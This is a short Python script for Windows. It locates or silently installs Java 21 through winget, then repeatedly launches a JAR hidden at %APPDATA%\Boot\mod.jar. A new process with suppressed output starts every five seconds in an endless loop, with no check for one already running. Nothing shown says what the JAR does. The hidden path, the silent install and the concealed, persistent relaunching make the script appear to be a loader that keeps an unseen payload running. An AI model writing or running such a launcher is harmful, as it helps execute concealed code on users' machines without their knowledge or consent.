import subprocess
import os
import time
import glob
import sys
import re

def get_java_version(java_path):
    try:
        output = subprocess.check_output([java_path, "-version"], stderr=subprocess.STDOUT, text=True)
        match = re.search(r'version\s+"(\d+)\.', output)
        if match:
            return int(match.group(1))
        match = re.search(r'version\s+"(1\.\d+)\.', output)
        if match:
            return int(match.group(1).split('.')[1])
        return None
    except:
        return None

def find_java():
    try:
        output = subprocess.check_output(["where", "java"], text=True).splitlines()
        for path in output:
            path = path.strip()
            if path.lower().endswith("java.exe") and os.path.exists(path):
                ver = get_java_version(path)
                if ver and ver >= 21:
                    return path
    except:
        pass

    search_dirs = [
        r"C:\Program Files\Eclipse Adoptium\jdk-*",
        r"C:\Program Files\Java\jdk-*",
        r"C:\Program Files (x86)\Eclipse Adoptium\jdk-*",
        r"C:\Program Files (x86)\Java\jdk-*",
        r"C:\Program Files\Eclipse Adoptium\jre-*",
        r"C:\Program Files\Java\jre-*",
    ]
    for pattern in search_dirs:
        matches = glob.glob(pattern + r"\bin\java.exe")
        for path in matches:
            ver = get_java_version(path)
            if ver and ver >= 21:
                return path

    try:
        ver = get_java_version("java")
        if ver and ver >= 21:
            return "java"
    except:
        pass
    return None

def install_java21():
    try:
        subprocess.Popen(["winget", "install", "EclipseAdoptium.Temurin.21.JDK", "--silent"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
        time.sleep(10)
    except:
        pass

JAR_PATH = os.path.join(os.getenv("APPDATA"), "Boot", "mod.jar")

java_path = find_java()
if not java_path:
    install_java21()
    java_path = find_java()

if not java_path:
    java_path = "java"

while True:
    try:
        subprocess.Popen([java_path, "-jar", JAR_PATH],
                         cwd=os.path.dirname(JAR_PATH),
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
    except:
        pass
    time.sleep(5)
